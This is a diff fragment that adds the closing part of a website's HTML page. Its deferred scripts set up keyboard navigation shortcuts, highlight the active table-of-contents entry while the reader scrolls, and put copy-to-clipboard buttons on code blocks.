+</footer>
+
+
+
+<script defer>
+  document.addEventListener("keydown", function (e) {
+    if (document.activeElement.isContentEditable) {
+      return false;
+    }
+    if (document.activeElement.tagName == "INPUT") {
+      return false;
+    }
+    if (e.altKey || e.ctrlKey || e.shiftKey) {
+      return false;
+    }
+    var key = e.key;
+    if (key === "h") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = "/";
+    } else if (key === "t") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = `https://${location.hostname}/tags`;
+    } else if (key === "i") {
+      e.preventDefault();
+      e.stopPropagation();
+      const inputs = document.querySelectorAll("input");
+      for (let i = 0; i < inputs.length; i++) {
+        if (inputs[i].offsetParent !== null) {
+          inputs[i].selectionStart = inputs[i].selectionEnd =
+            inputs[i].value.length;
+          inputs[i].focus();
+          break;
+        }
+      }
+    }
+    return false;
+  });
+</script>
+
+
+<script defer>
+  function throttle(fn, wait) {
+    var time = Date.now();
+    return function () {
+      var now = Date.now()
+      if (time + wait - now < 0) {
+        fn();
+        time = now;
+      }
+    };
+  }
+
+  function scrollHandler() {
+    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));
+
+    function scrollCallback() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+
+      
+      for (var i = 0; i < anchors.length; i++) {
+        var anchorId = anchors[i].getAttribute("id");
+        var link = document.querySelector(
+          'nav ul li a[href="#' + anchorId + '"]',
+        );
+        if (link) {
+          link.classList.remove("active-toc");
+        }
+      }
+
+      
+      for (var i = anchors.length - 1; i >= 0; i--) {
+        var offsetTop = anchors[i].offsetTop;
+        if (scrollTop > offsetTop - 75) {
+          var anchorId = anchors[i].getAttribute("id");
+          var link = document.querySelector(
+            'nav ul li a[href="#' + anchorId + '"]',
+          );
+          if (link) {
+            link.classList.add("active-toc");
+            break;
+          }
+        }
+      }
+    }
+
+    window.addEventListener(
+      "scroll",
+      throttle(scrollCallback, 300),
+    );
+  }
+  setTimeout(scrollHandler, 100);
+</script>
+
+<script defer>
+  function addCopyButtonToCodeBlocks() {
+    
+    const codeBlocks = document.querySelectorAll('code[class^="language-"]');
+
+    codeBlocks.forEach((codeBlock) => {
+      const copyButton = document.createElement("button");
+      copyButton.classList.add("copy-code-button");
+      copyButton.innerHTML = "copy";
+
+      
+      copyButton.addEventListener("click", () => {
+        
+        const elements = codeBlock.querySelectorAll(".cl");
+        let codeToCopy = "";
+        elements.forEach((element) => {
+          codeToCopy += element.innerText;
+        });
+        navigator.clipboard.writeText(codeToCopy);
+
+        
+        copyButton.innerHTML = "copied!";
+        setTimeout(() => {
+          copyButton.innerHTML = "copy";
+        }, 1500);
+      });
+
+      
+      codeBlock.parentNode.before(copyButton);
+    });
+  }
+  setTimeout(function () {
+    addCopyButtonToCodeBlocks();
+  }, 100);
+</script>
